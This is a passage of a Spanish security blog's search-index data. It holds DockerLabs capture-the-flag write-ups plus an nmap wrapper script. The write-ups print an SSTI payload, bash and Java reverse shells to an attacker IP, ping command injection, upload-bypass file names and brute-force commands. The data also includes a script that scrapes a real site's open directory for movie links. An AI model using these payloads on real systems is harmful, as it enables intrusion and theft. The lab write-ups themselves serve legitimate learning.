pasarle john y que nos de el passphrase que nos hace falta.Recordemos primero la hasheamos con ssh2john y posterior lanzamos john junto a rockyou.Una vez ya tenemos el passphrasse cambiamos los permisos del id_rsa e ingresamos.YA somo root y la maquina queda a nuestra disposicion.Muchas gracias por leer."
+  },
+  
+  {
+    "title": "Pinguinazo , DockerLabs",
+    "url": "/posts/pinguinazo/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, ssti",
+    "date": "2024-05-21 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema,un server side template inyection , revshell y escalada.Herramientas y recursos usados  Nmap  Revsh...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema,un server side template inyection , revshell y escalada.Herramientas y recursos usados  Nmap  Revshell java  revshellEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pinguinazo 172.17.0.2  Reporte nmapPodemos ver claramente la version que corre  y el puerto por el que tenemos acceso al werkzeug 3.1 Revisamos la web y el titulo nos confirma esta creada con flask y por lo general flask usa el motor de plantillas jinja.”Django tambien lo usa”.Solo teniendo eso al alcanze hay que ver que vulberabilidad podria tener.Yo me volvi loco buscando como explotar eso estuve intentando quebrar el pin de la consola para tener acceso pero sin resultado dado que se necesitan recuperar varios datos del server y en esta version creo que es imposible de obtenerlos.Haber si hay suerte y mario nos arma una con esa vulnerabilidad, que quede con las ganas de aprenderla.Por tanto tiene que ser mas sencillo, pruebo a inyectar codigo html.Si se ha tragado el html podriamos probar a inyectar otro tipo de payload que no solo lo interprete si no que ejecute codigo , para ello probamos con un ssti dado que la info info obtenida de google nos dice que podria ser vulnerable.Comprobamos con una divison contra 0 y vemos que nos da error por tanto tenemos un ssti y podrmos lanzarnos una revshell desde ahi mismo.Podriamos leer ficheros pero teniendo solo el puerto 5000 abierto no nos sera de utilidad asi que nos mandamos un revshell.  Lectura de ficheros ejemplo.{{config.class.init.globals[‘os’].popen(‘cat /etc/passwd’).read()}}Explotacion e infiltracionLanzando revshell , como siempre primero a la escucha con nc.Yo me he creado un fichero html em mi maquina atacante con el contendio para mandarme una revshell despues lo pipeo a bash para que lo ejecute el server.Contenido del archivo html.bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.0.112/443 &lt;&amp;1'Levantamos un server con python3 y lanzamos la orden desde la web.Ya estamos dentro de la maquina.EscaladaYo como siempre empiezo con sudo -l.Me toca buscar en la web porque nunca he realizado la escalada con java asi que al lio.Debemos de crear un fichero java con el contenido que creamos oportuno y lo ejecutamos con sudo.En este caso creamos un revshellpublic class shell {    public static void main(String[] args) {        Process p;        try {            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1\");            p.waitFor();            p.destroy();        } catch (Exception e) {}    }}Creamos el fichero con el contenido correcto yo lo llamo revshell.java y posteriormente ejecuto java con sudo llamando al script recien creado.Hasta aqui el pinguinazo que me volvio loco …….Gracias por leer."
+  },
+  
+  {
+    "title": "PingPong , DockerLabs",
+    "url": "/posts/pingpong/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-19 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, bypass en webshell, movimiento lateral a morir y escalada final.Herramientas y recursos usados  nm...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, bypass en webshell, movimiento lateral a morir y escalada final.Herramientas y recursos usados  nmap  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pingpong 172.17.0.2  Reporte nmapComo podemos extraer del reporte de nmap disponemos de un servicio apache tanto por el 80 como por el 443 y un servicio por el 5000.Revisamos el 80 y el 443 sin exito pero en el 5000 tenemos suerte.Es una web que nos permite realizar ping. Abusamos de eso y probamos.Abusolocalhost &amp;&amp; cat /etc/passwdNos ponemos a la escucha y nos mandamos una revshell.Infiltracion y movimiento lateralEstamos dentro con el usario freddy.Nos movemos al usuario bobby con dpkg.Usamos searchbins para ver como se usa.Ahora como bobby lo mismo sudo y a ver que hay.Ahora podemos desplazarnos con php y sudo hasta la usuaria gladys.Ya somos gladys ahora sudo , find lo de siempre.Sudo funciono.Si os fijais en la imagen estan los paso para ser chocolatito incluida la contraseña que leemos del archivo en opt a traves del comando sudo.Ahora a hacer login con chocolatito.Ya somos chocolatito en una terminal con un funcionamiento fantasma , mas que nada pq no veo lo que escribo. :)Volvemos a realizar los mismos pasos.Sudo de nuevo.Abusamos de awkSi pensabamos que acabamos con el boss no es asi aun que llegar a root y tenemos la escala final con el binario sedEscalada finalA Abusar de sedMuchas gracias por llegar hasta aqui y leer.Divertida pero estresante con tanto movimiento."
+  },
+  
+  {
+    "title": "Olvida netflix hbo disney ....",
+    "url": "/posts/vide2m3u/",
+    "categories": "Software",
+    "tags": "scripts, bash, scraping",
+    "date": "2024-05-18 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "VIDEO TO M3U  Aporte antiguo pero aun vigente en muchas maquinas seguimos listando.En el siguiente script nos aprovechamos de que apache nos deje listar los directorios donde han subido peliculas o...",
+    "content": "VIDEO TO M3U  Aporte antiguo pero aun vigente en muchas maquinas seguimos listando.En el siguiente script nos aprovechamos de que apache nos deje listar los directorios donde han subido peliculas o series.Para buscar lo que nos interesa podemos hacer uso de google-dorks os dejo un ejemplo sencillo.inurl: \"index of /cine\"Podeis complicarlo como querais ese dork a mi ese ya me aporta resultados.Tampoco abuseis de los dokrs pues son empleados en tecnicas para buscar fallos de seguridad y vulnerabilidades entre otras cosas y por lo tanto google esta al acechorepoHumilde scriptEs sencillo pero funcional , el modo de uso es simple solo debemos editar la vriable url introduciendo la direccion desde donde haremos el scraping web , la direcion la buscais haciendo uso de los dorks.#!/bin/bash# URL de la página web#url=\"https://tvinnov.online/Peliculas/\"url='http://pilarika.no-ip.org/Cine/Cine_01/'# Nombre del archivo de salidaoutput_file=\"videos.m3u\"# Obtener el contenido de la página webcontent=$(curl -s \"$url\")# Extraer los enlaces de video utilizando expresiones regularesvideo_links=$(echo \"$content\" | grep -Eo 'href=\"([^\"#]+\\.mp4)\"' | cut -d'\"' -f2)# Crear el archivo de salida y escribir los enlaces de videoecho \"#EXTM3U\" &gt; \"$output_file\"for link in $video_links; do  echo \"#EXTINF:0,$link\" &gt;&gt; \"$output_file\"  echo \"$url$link\" &gt;&gt; \"$output_file\"doneecho \"Se han extraído los enlaces de video y se han guardado en el archivo $output_file.\"Gracias y compartan"
+  },
+  
+  {
+    "title": "Picadilly , DockerLabs",
+    "url": "/posts/picadilly/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-17 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, decodificacion , webshell y escalada.Herramientas y recursos usados  nmap  dcode.frEnumeracionEmpe...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, decodificacion , webshell y escalada.Herramientas y recursos usados  nmap  dcode.frEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX picadilly 172.17.0.2  Reporte nmapComo vemos en el reporte de namp nos muestra dos web una en puerto 80 y otra en el 443.Revisamos la del puerto 80 primero y nos lista un archivo txt.DecodeandoDe esa nota extraemos un posible usuario y un posible password el cual esta codificado , en este punto nos vamos a dcodeDe  momento ya tenemos eso, para donde nos servira no tengo idea, asi que avanzamos hacia la web con ssl.InfiltracionDandole un vistazo rapido veo que permite tambien la subida de archivos asi que le tiro una webshell.php y la sube sin problemas asi que nos vamos al directorio uploads y la cargamos y nos ponemos en escucha para recibir la revshell.Una vez recibida la shell nos cambiamos rapidamente al usario maeto del cual obtuvimos el pass en dcode , hice todas posibles combinaciones y el unico resultado coherente  estaba mal ,hay que sacarle la x.Con sudo podemos escalar privilegios.Por otro lado no se que utilidad tiene que el archivo post.txt tenga permisos de ejecucion para todos.Aprevechemos php.EscaladaOtra completa gracias por leer comenten dudas o errores que veanSaludos…"
+  },
+  
+  {
+    "title": "Script escaneo nmap preconfigurado",
+    "url": "/posts/nmap-command/",
+    "categories": "Software",
+    "tags": "scripts, nmap, bash",
+    "date": "2024-05-17 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Este script es una pequeña automatizacion de los comandos mas comunes y usales en los ctf’s de modo que no tengamos que tipear todo el comando.Va a estar en constante evolucion , cada vez que encue...",
+    "content": "Este script es una pequeña automatizacion de los comandos mas comunes y usales en los ctf’s de modo que no tengamos que tipear todo el comando.Va a estar en constante evolucion , cada vez que encuentre un comando que nos ayude ire agreagndolo de a poco una vez este comprobada su utilidad para el aprendizaje que necesitamos.El script en cuestion es una ligera modificacion del que hizo el pinguino de mario , a mi personalmente me ayuda muchisimo el ver como otros han creado sus scripts , de hecho creo que es la forma correcta de aprender ,leer codigo y modifcarlo a tus necesidades.El modo de uso es muy simple ejecutas el script y el mismo te pide que le indiques la ip de la victima y el nombre del archivo de salida y posteriormente te crea un tambien un html porque  para mi esa es la mejor manera de visualizar los resultado de nmap.nmap_commandMaalfer#!/bin/bash#Configuramos los coloresrojo='\\e[0;31m\\033[1m'sincolor='\\033[0m'cyan_luminoso='\\033[1;36m'# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)finalizar() {    echo -e \"\\e[1;31m\\nFinalizando el script\\e[0m\"    exit}trap finalizar SIGINT#Comprobamos si es rootif [ $(id -u) -ne 0 ]; thenecho -e \"${rojo}Tienes que ser root para ejecutarlo.\"exitfi# Verificar si Nmap está instaladoif ! command -v nmap &amp;&gt; /dev/null; thenecho -e \"${cyan_luminoso}Nmap no está instalado.${sincolor}\"read -p \"¿Deseas instalar Nmap ahora? (s/n): \" respuestaif [[ $respuesta =~ ^[Ss]$ ]]; theninstalar_nmapelseecho -e \"${rojo}Nmap es necesario para ejecutar este script. Por favor, instala Nmap y vuelve a intentarlo.${sincolor}\"exitfifi# verificamos que distribucion linux este usandoinstalar_nmap() {distribucion=$(cat /etc/*-release | grep \"^ID=\" | awk -F'=' '{print $2}' | tr -d '\"')# Empezamos con la instalacionen para cada una de las distibuciones de linux.case $distribucion inubuntu|debian)apt-get updateapt-get install -y nmap;;centos|fedora)yum updateyum install -y nmap;;arch)pacman -Syu --noconfirm nmap;;*)echo -e \"${rojo}No se pudo determinar la distribución de Linux. Por favor, instala Nmap manualmente.${sincolor}\"exit;;esac}#Empezamos con las opciones de ejecucion de nmap , limpiamos pantalla y arrancamos.clearecho -e '┏┓╻┏┳┓┏━┓┏━┓   ┏━┓┏━╸┏━┓╻┏━┓╺┳╸   ┏━╸┏━┓┏━┓   ╺┳┓╻ ╻┏┳┓┏┳┓╻ ╻┏━┓┃┗┫┃┃┃┣━┫┣━┛   ┗━┓┃  ┣┳┛┃┣━┛ ┃    ┣╸ ┃ ┃┣┳┛    ┃┃┃ ┃┃┃┃┃┃┃┗┳┛┗━┓╹ ╹╹ ╹╹ ╹╹     ┗━┛┗━╸╹┗╸╹╹   ╹    ╹  ┗━┛╹┗╸   ╺┻┛┗━┛╹ ╹╹ ╹ ╹ ┗━┛    Script original por EL PINGUINO DE MARIO  https://github.com/maalfer   \\n  '  read -p \"Introduce la IP a escanear: \" ipread -p \"Indica el nombre de salida del archivo: \" nombrewhile true; doecho -e \"\\n1) Puertos abiertos con versiones y servicios \"echo \"2) Buscar en los 65535 sin versiones ni servicios\"echo \"3) Limitamos a los 100 puertos comunes\"echo \"4) Buscamos vulnerabilidades scripts nse por defecto en todos los puertos\"echo \"5) Escaneo de puertos UDP\"echo \"6) Hay firewall? probemos.\"echo \"7) For CTF'S.\"echo \"8) Enumeracion share samba\"echo \"9) Salir\"read -p \"Selecciona una opción: \" opcioncase $opcion in1)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -A $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;2)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -open $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;3)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- --open --top-ports 100 $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;4)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sV $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;5)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sU $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;6)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -sA $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;7)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;8)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p 139,445 --script smb-enum-shares $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;9)break;;*)echo -e \"${rojo}\\nOpción incorrecta, elige el tipo de escaneo correcto.\"${sincolor};;esacdoneAcepto sugerencias e ideas , me gustaria transformarlo y declarar funciones pero eso sera cuando sepa mas."
+  },
+  
+  {
+    "title": "DockerLabs , DockerLabs",
+    "url": "/posts/dockerlabs/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-16 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios y ficheros , file bypass , revshell y escalada final.Herramientas y rec...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios y ficheros , file bypass , revshell y escalada final.Herramientas y recursos usados  Nmap  feroxbuster  bypass en control de archivosEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX dockerlabs 172.17.0.2  Reporte nmapEn este caso solo nos da el 80 de apache, asi que revisamos la web.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/La web no nos aporto nada .Lanzamos Feroxbuster tenemos suerte y nos encuentra una carpeta uploads y un archivo php.BypassLa subida de archivos esta restringida solo permite zip , tenemos que bypasear eso.Yo probe añadiendo y modificando la extension sin suerte.webshell.zip.phpwebshell-php.zipwebshell.php%0d%0aNo funciono , recorde que en una maquina utilce un tipo de extensio que es de compresion en php acabado en PHARpharMe lanzo burpsuite y miro el accept encoding , no estoy seguro de que sirva pero podriamos trastear mas con el burp haciendo un ataque para ver que extensiones perimte (mi nivel de burp es 0,1) no se como hacer eso asi que pruebo manualmente a subir el .pharInfiltracionTenemos exito subiendolo con esa extension , asi que directos a la websshel que acabamos de subir para enviarnos directo una revshell amnuestra maquina.Como vemos en la imagen nos mandamos una revshell poniendos antes a la escucha.Una vez logueado hacemos lo oportuno.Vemos cosas prometedoras con sudo parece que algo nos deja hacer y tambien encotramos la nota.txt.Revisemos la nota.EscaladaEl fichero nos dice donde esta la clave de root y sudo nos daba dos opciones para leer ficheros como son grep y cut , hacemos uso de searchbins para ver como se explotaCreamos la variable de entorno hacia el archiovo que queremos leer y luego ejecutamos el comando sudo.Listo hasta aqui la maquina.Difundan y compartan.Muchas gracias por leer"
+  },
+  
+  {
+    "title": "Stranger , DockerLabs",
+    "url": "/posts/stranger/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-14 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios ,desencriptacionHerramientas y recursos usados  Nmap  feroxbuster  file...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios ,desencriptacionHerramientas y recursos usados  Nmap  feroxbuster  file  opensslEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 21,22,80 -sCV  --min-rate 5000 172.17.0.2 -oX stranger  Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ftp , apache y ssh.Revismos la web y lo primero que encointramos es un posible user.Lanzamos Feroxbuster en busca de directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/Como vemos nos muestra varios archivos y carpeta que no veiamos.Tratemos de ver los dos archivos y revisemos esa nueva web, de la web podemos extraer lo que tambien podrian ser usuarios y passwords anotemos.En secret.html nos da isntruciones precisas asi que al lio con hydra.Mientra hydra trabaja revisamos el private.txt.wget http://172.17.0.2/strange/private.txtPara empezar no es un txt me devuelve cosas incoherentes.El comando file nos indica que son datos, no es asci por lo tanto diria que puede ser algo encriptado , le paso herramientas para estego y no lo reconoce.No hay problema hydra encontro la passs para el ftp asi que miremos por ahi.Hacemos login con los credenciales obtenidos de hydra y descargamos el fichero.OpensslTenemos el fichero private.txt y el .pem file nos dijo que eran datos y desde el ftp se nos dio una clave.Los ficheros pem,crt,key,ca,… para mi se asocian todos con ssl , ahora nos faltaria averiguar el algoritmo de codificacion.Y para mi conocimiento esta parte es prueba y error.A probar con openssl hasta que nos de resultado positivo.Despues de unos cuantos comandos sin exito y unas busquedas de google hallo el comando esquivo y resulta ser rsa.¿como se corfima en que esta encriptado?.prueba y error es una locura.openssl pkeyutl -decrypt -inkey private_key.pem -in private.txt -out contenidoTenemos exito y nos da un pass o eso quiero pensar.InfiltracionProbemos manualmente los login y el pass que tenemos.Probe con mweeler , primer user que nos dio en la web raiz “creo recordar” y estamos dentro.Una vez dentro hacemos uso de find , sudo, buscamos scripts para cambiar de usuario y no soi capaz de encontar nada con esos metodos.Listo usuarios haber quienes tienen sh.Como vemos en la salida del passwd admin tambien tiene cuenta local y no solo en ftp probemos a entrar con las credenciales que ya tenemos.Llegamos al fondo eso si , no sin complicaciones.Garcias por leer, si ves errores comenta yo tambien sigo aprendiendo.                    Posibles usuarios        Posibles passwords                            mwheeler        iloveu                    will        demogorgon                    demogorgon                             admin                     Muchas pistas falsas esta bueno asi hay que emplear un poco mas de logica no tanto lanzar comandos."
+  },
+  
+  {
+    "title": "Collections , DockerLabs",
+    "url": "/posts/collections/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-14 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios , busqueda de dominio , wordpress lfi, movimiento lateral y escalada fi...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios , busqueda de dominio , wordpress lfi, movimiento lateral y escalada final.Herramientas y recursos usados  Nmap  feroxbuster  wpscan  hydra sin exito con el form  mongoEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX collections 172.17.0.2  Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ssh , apache y y una bbdd de mongodb.Revismos la web y lo primero que encontramos al acceder es la pagina por defecto de apache pero recordemos que nmap nos dijo que habia una db por tanto hay algo mas.Lanzamos Feroxbuster en busca de directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/Como vemos nos muestra que hay un wordpress , al entrar a la nueva ruta vemos que no carga bien los estilos asi que miramos el codigo para ver el dominio.Lo añadimos a etc/hosts y lanzo wpscan para que busque vulnerabilidades y usuarios.Tenemos suerte y nos encuentra un user y nos indica que tenemos un local file inclusion, uno que ya conocemos de otra maquina ,esta vez voy a interntar otra forma de alcanzar el objetivo.PoCVamos a seguir haciendo fuerza bruta contra wordpress usando wpscanwpscan --url http://collections.dl/wordpress/ -U chocolate -P /home/quino/Descargas/rockyou/rockyou.txtTenemos login en wordpress ,  pero vamos al lfi antes de intentar acceder hemos de acostumbrarnos a mirar todo lo posible.Explotacion LFIDescargo un scrypt python desde lfiSiguo las instruciones y ejecuto buscando usuarios propios del sistema no de la web.python3 CVE-2018-7422.py -u http://collections.dl/wordpress/ -f /etc/passwd | grep /bin/bash  Automatiza un poco mas la tarea.Lo que vemos es que tenemos tres usarios en el sistema y tambien esta chocolate, primero contra el, y con la misma pass que en la web pero no tengo exito, asi que hydra.hydra -l chocolate -P ../../../../../quino/rockyou.txt ssh://172.17.0.2 -t 4Accedemos al sistema con los credenciales proporcionados.Ejecutamos los comandos tipicos y no nos proporcionan nada , recordemos que nmap nos dijo que habia un db asi que a ella accedemos con mongosh.Como es la primera vez que uso este tipo de base de datos me equivoque en un comando y al retroceder con la la flecha arriba para ver que comando habia ejecutado, no se pq aparecio el insert qu ele hizo mario a la bbdd asi que de momento me quedo sin saber como mostrar el contemido de esa tabla.La cuestion es que tengo otro user y pass.Nos monvemos al otro usuario.Como siempre probamos lo tipico sin exito .Antes de empezar a transferirnos algun archivo probamos las contraseñas que hemos obtenido y para sorpresa mia tenemos suerte , lo caul me ha sorprendido pq el usuario chocolate no tenia la misma en la web que en el sistema.Buena maquina e interesante pq no consegui acertar con el payloadcorrecto para reventar wordpress con hydra http-post-form.Gracias por leer."
+  },
+  
+  {
+    "title": "Fileception , DockerLabs",
+    "url": "/posts/fileception/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-13 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  s...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  stegseek  steghide  Cyberchef  strings  fileEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 21,22,80 -sCV  --min-rate 5000 172.17.0.2 -oX nmapokReporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ftp , apache y ssh.Como vemos nos va tocar recabar info de varios lugares asi que para empezar y dado que nmap dice que el ftp nos admite anonimos , vamos a ver que tenemos ahi.  Por cierto el fuzzing no me encontro nadaEntramos por ftp.Hay una imagen descargemosla.Al tratar de ver si hay algo me dice que no encuentra la palabra clave , es decir , la imagen esconde algo y ademas necesita de un codigo para ver el contenido.steganografiaEn el ftp no queda nada, a mirar la web , que creo es lo primero en comprabar pero bueno sigamos.Nos encontramos con la pagina de apache por defecto pero revisando el codigo fuente se ve que dejaron comentario.Primero nos dice un usario Peter y despues nos habla de estego osea confirma lo que sabiamos de la foto y despues nos da una clave que dice es base ..32..64..quien sabe , 64 no es eso seguro.Nos abrimos cyberchef y buscamos un resultado coherente con la pista que nos dio.Ya tenemos la clave para exponer el contenido de la imagen sin crakear nada , podemos extralo de forma habitual.Cual es mi sorpresa al extralo me encuentro con todo estoSan google amigos…Ahora que sabemos que es,  a decodificar ,yo voy a dcode.fr siempre me acuerdo de ella por un cifrado rosacruz que me encontre en otra maquina.Si recapitulamos tenemos el nombre de user y una password a ver si funcionanInfiltracionEstamos dentro, con peter ahora hacemos lo tipico hasta que encontremos algo.Vamos a tmp y encontramos dos archivos un txt y un odt , me descargo los dos lanzando python3.Miro el contenido de los dos y es el mismo salvo que me detecta algo raro el libre ofice cuando lanzo el odt.Revisamos mas a fondo ese archivo.Con strings tambien sacamos algo mas de info.Ahora que sabemos que es cambiamos la extension , descomprimimos y revisamos el contenido.En el segundo archivo que reviso tengo suerte me arroja usuario y un password en base64.echo -n 'ODBoMjM4MGgzNHVvdW8zaDQ=' | base64 -dHacemos ssh con octopus y el password decodeado y seguimos como siempre, directorio local , sudo , find …Con sudo tenemos todo ,listo….Enroscada la maquina esta no me imagino vuestras cabezas creando estos juegos en fin muchas gracias por ello.Aprender asi da gustoSaludos"
+  },
+  
+  {
+    "title": "Amor , DockerLabs",
+    "url": "/posts/amor/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-13 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  s...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  stegseekEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 22,80 -sCV -n -oX amor 172.17.0.2Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio apache y ssh.Empezemos revisando la web.Estamos de suerte nos indica dos usarios ese mensaje.Espero que si juan fue despedido haya eliminado sus accesos, asi que hago fuerza bruta contra carlota.hydra -l carlota -P ../../../../rockyou.txt ssh://172.17.0.2 -t 4```![hydra](assets/amor/hydra.png) ## InfiltracionHacemos login con Carlota \"ojo con la password de la de ciberseguridad\" casa de herrero ...![login](assets/amor/ls.png)Como vemos no tiene sudo pero encontramos una carpeta con una imagen asi que la descargamos.Como por suerte en esta puso python lo hacemos sin mucho problemaUna vez tengamos la imagen ejecutamos.## Esteganografia```bashstegseek imagen.jpg ../../../../rockyou.txtComo vemos nos proporciona un archivo con un password codeado en bas64.Lo decodeamosecho 'ZXNsYWNhc2FkZXBpbnlwb24=' | base64 -dMovimiento lateralObtenemos una password y probamos a hacer login con oscar.Como vemos en la imagen de abajo los del departamento si eliminaron a Juan .Una vez logeados comprobamos lo tipico.Como vemos podemos hacer uso de ruby para hacernos root.Escalada finalEjecutamos ….Llego al final esta maquinitaGracias por leer compartan ,muchas gracias."
+  },
+  
+  {
+    "title": "BreakMySsh , DockerLabs",
+    "url": "/posts/breakssh/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-11 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , explotacion de ssh , decryt md5 y login.Herramientas y recursos usados  Nmap  hydra  Python  Goo...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , explotacion de ssh , decryt md5 y login.Herramientas y recursos usados  Nmap  hydra  Python  GoogleEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p 1-100 --open -sC 172.17.0.2 -oX breaknmapReporte nmapNmap nos informa que solo tenemos el 22 abierto y con el nombre de la maquina ya tenemos claro que nos invita e explotar el servicio SSH de algun modo.Si lanzamos un nmap -sV nos dara la version que corre que es una 7.7.Ahora buscamos un script que nos permita realizar la tarea de enumeracion.ExplotacionEn este punto directamente hubiesemos podido tirar con hydra o similar, para hacer fuerza bruta contra el user y el pass.Yo personalmente prefiero tener alguno de esos dos datos , ademas la maquina para mi es para que aprendamos a manejar ese tipo de enumeracion.Tambien podriais con msfconsoleLink to exploitDescargenlo y sigan los pasos que indica el autor en github../CVE-2018-15473.py -p 22 -w ../../../../rockyou.txt  172.17.0.2Con el usario que nos dio el exploit lanzamos hydra.hydra -l lovely -P ../../../../rockyou.txt ssh://172.17.0.2 -t 4Nos conectamos via ssh con el usuario lovely , buscamos como escalar y encontramos un archivo oculto en opt , no obstante una vez conseguimos el primer user volvi a lanzar hydra contra root y obtuvo su pass.MD5 decryptDescifrando el hash.Podemos ir a la web de crackstation hay varias de 